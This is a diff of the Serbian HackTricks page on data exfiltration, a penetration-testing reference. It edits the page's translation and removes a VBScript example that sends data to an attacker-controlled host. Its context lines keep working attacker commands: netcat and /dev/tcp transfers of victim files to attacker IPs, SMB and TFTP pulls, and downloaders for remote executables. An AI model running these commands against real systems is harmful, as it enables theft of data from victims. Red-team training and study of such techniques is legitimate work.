@@ -1,18 +1,19 @@
 # Izfiltracija
 
+{% hint style="success" %}
+Naučite i vežbajte hakovanje AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stručnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Naučite i vežbajte hakovanje GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stručnjak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Podržite HackTricks</summary>
 
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
+{% endhint %}
 
 **Try Hard Security Group**
 
@@ -22,9 +23,9 @@ Drugi načini podrške HackTricks-u:
 
 ***
 
-## Često beleženi domeni za izfiltriranje informacija
+## Često dozvoljeni domeni za izfiltriranje informacija
 
-Proverite [https://lots-project.com/](https://lots-project.com/) da biste pronašli često beležene domene koje mogu biti zloupotrebljene
+Proverite [https://lots-project.com/](https://lots-project.com/) da biste pronašli često dozvoljene domene koje mogu biti zloupotrebljene
 
 ## Kopiranje\&lepljenje Base64
 
@@ -65,7 +66,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Postavljanje fajlova
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer ispisuje GET i POST zahteve (uključujući zaglavlja)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer koji prikazuje GET i POST zahteve (takođe zaglavlja)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Python modul [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -79,8 +80,6 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS Server**
-
 ### **HTTPS Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
@@ -193,51 +192,15 @@ Windows
 
 ### Exfiltration
 
-#### Exfiltration Over Alternative Protocol
+Kada je reč o izvlačenju podataka sa Windows sistema, postoje različite metode koje se mogu koristiti. Neke od ovih metoda uključuju:
 
-1. **Description**
-   
-   Data exfiltration can be achieved using various protocols other than HTTP/HTTPS, such as DNS, ICMP, or SMTP.
+1. **Upotreba FTP-a:** Korišćenje FTP klijenta za prenos podataka sa zaraženog sistema na udaljeni server.
+2. **Korišćenje Web protokola:** Korišćenje HTTP ili HTTPS protokola za slanje podataka na udaljeni server.
+3. **Korišćenje DNS tunela:** Korišćenje DNS saobraćaja za skrivanje podataka i njihovo slanje na udaljeni server.
+4. **Korišćenje E-maila:** Slanje podataka putem e-mail poruka.
+5. **Korišćenje USB uređaja:** Kopiranje podataka na USB uređaj radi fizičkog iznošenja sa zaraženog sistema.
 
-2. **Detection**
-   
-   - Monitor network traffic for unusual DNS requests, especially those containing encoded data.
-   - Look for abnormal ICMP or SMTP traffic patterns.
-   - Implement egress filtering to restrict unnecessary outbound traffic.
-
-3. **Prevention**
-   
-   - Use encryption to protect data in transit.
-   - Implement network segmentation to limit lateral movement.
-   - Disable unnecessary services and protocols to reduce attack surface.
-
-4. **Tools**
-   
-   - **dnscat2**: A tool for tunneling data through DNS servers.
-   - **Iodine**: A tool for tunneling IPv4 data through a DNS server.
-
-#### Exfiltration Over Unencrypted Protocols
-
-1. **Description**
-   
-   Attackers can exfiltrate data over unencrypted protocols like FTP, Telnet, or SNMP.
-
-2. **Detection**
-   
-   - Monitor network traffic for FTP, Telnet, or SNMP connections.
-   - Look for large amounts of data being transferred over these protocols.
-   - Implement deep packet inspection to analyze payload contents.
-
-3. **Prevention**
-   
-   - Use secure protocols like SFTP, SSH, or SNMPv3.
-   - Implement strong authentication mechanisms.
-   - Encrypt data at rest and in transit.
-
-4. **Tools**
-   
-   - **Wireshark**: A network protocol analyzer for monitoring and analyzing network traffic.
-   - **Snort**: An open-source network intrusion detection and prevention system.
+Svaka od ovih metoda ima svoje prednosti i mane, a izbor odgovarajuće metode zavisi od specifičnih zahteva i okolnosti napada.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -259,16 +222,14 @@ sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## NC
-
-NC (Netcat) je moćan alat za mrežno programiranje koji se često koristi za prenos podataka između sistema putem mreže. Može se koristiti za izvršavanje različitih zadataka, uključujući i eksfiltraciju podataka.
+## Mrežni kanal
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Preuzimanje fajla sa žrtvine mašine
+### Preuzimanje fajla sa žrtve
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -302,15 +263,15 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Ako možete slati podatke na SMTP server, možete kreirati SMTP da primite podatke pomoću python-a:
+Ako možete poslati podatke na SMTP server, možete kreirati SMTP da primite podatke pomoću python-a:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Podrazumevano u XP i 2003 (u drugima mora biti eksplicitno dodato tokom instalacije)
+Podrazumevano u XP i 2003 (u drugima ga je potrebno eksplicitno dodati tokom instalacije)
 
-Na Kali, **pokreni TFTP server**:
+Na Kali, **pokrenite TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -322,7 +283,7 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Na **žrtvu**, povežite se sa Kali serverom:
+U **žrtva**, povežite se sa Kali serverom:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -333,55 +294,6 @@ Preuzmite fajl pomoću PHP jednolinijske komande:
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
-
-### VBScript Exfiltration Techniques
-
-VBScript can be used to exfiltrate data from a compromised system. Below are some common techniques:
-
-1. **Writing to Files**: VBScript can write data to a file on the system, which can then be exfiltrated using various methods.
-
-2. **Sending Emails**: VBScript can be used to send emails with the exfiltrated data as attachments or within the email body.
-
-3. **HTTP Requests**: VBScript can make HTTP requests to an external server controlled by the attacker to exfiltrate data.
-
-4. **DNS Requests**: VBScript can make DNS requests with encoded data to exfiltrate information.
-
-### Example VBScript Exfiltration Code
-
-```vbscript
-' Example VBScript code for exfiltrating data
-
-' Write data to a file
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-Set objFile = objFSO.CreateTextFile("C:\exfiltrated_data.txt", True)
-objFile.Write "Sensitive data to exfiltrate"
-objFile.Close
-
-' Send an email
-Set objEmail = CreateObject("CDO.Message")
-objEmail.From = "attacker@example.com"
-objEmail.To = "recipient@example.com"
-objEmail.Subject = "Exfiltrated Data"
-objEmail.TextBody = "Attached is the exfiltrated data."
-objEmail.AddAttachment "C:\exfiltrated_data.txt"
-objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
-objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.example.com"
-objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
-objEmail.Configuration.Fields.Update
-objEmail.Send
-
-' Make an HTTP request
-Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-objHTTP.Open "GET", "http://attacker-controlled-server.com/exfiltrate.php?data=exfiltrated_data", False
-objHTTP.Send
-
-' Make a DNS request
-Set objDNS = CreateObject("MSXML2.ServerXMLHTTP")
-objDNS.Open "GET", "http://attacker-controlled-dns.com", False
-objDNS.Send
-```
-
-These are just a few examples of how VBScript can be used for exfiltration. It is important to note that using VBScript for malicious purposes is illegal and unethical.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -419,7 +331,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` ne samo što omogućava inspekciju binarnih fajlova već takođe ima **mogućnost da ih rekonstruiše iz heksadecimalnog koda**. To znači da, pružajući heksadecimalni kod binarnog fajla, `debug.exe` može generisati binarni fajl. Međutim, važno je napomenuti da debug.exe ima **ograničenje u sastavljanju fajlova do veličine od 64 kb**.
+Program `debug.exe` ne samo što omogućava inspekciju binarnih fajlova već takođe ima **mogućnost da ih rekonstruiše iz heksadecimalnog oblika**. To znači da, pružajući heksadecimalni oblik binarnog fajla, `debug.exe` može generisati binarni fajl. Međutim, važno je napomenuti da debug.exe ima **ograničenje u sastavljanju fajlova do 64 kb veličine**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -428,3 +340,24 @@ wine exe2bat.exe nc.exe nc.txt
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
+
+**Try Hard Security Group**
+
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+{% hint style="success" %}
+Učite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Podržite HackTricks</summary>
+
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+
+</details>
+{% endhint %}
